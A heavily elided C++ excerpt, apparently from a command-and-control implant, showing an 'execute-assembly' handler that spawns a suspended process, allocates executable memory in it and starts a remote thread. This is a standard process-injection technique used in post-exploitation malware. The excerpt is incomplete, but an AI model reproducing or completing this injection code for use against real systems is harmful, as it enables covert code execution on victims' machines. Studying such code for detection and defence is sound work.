...
BOOL CommandExecuteAssembly( json& args, string artifact, json& result ) {
    ...
    if (!CreateProcessA(
            NULL, spawnto, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi )) {
    ...
    memory =
        VirtualAllocEx( pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if (!memory) {
        result["name"]   = "output";
    ...
    hThread =
        CreateRemoteThread( pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0, NULL );
    if (hThread == NULL) {
        result["name"]   = "output";
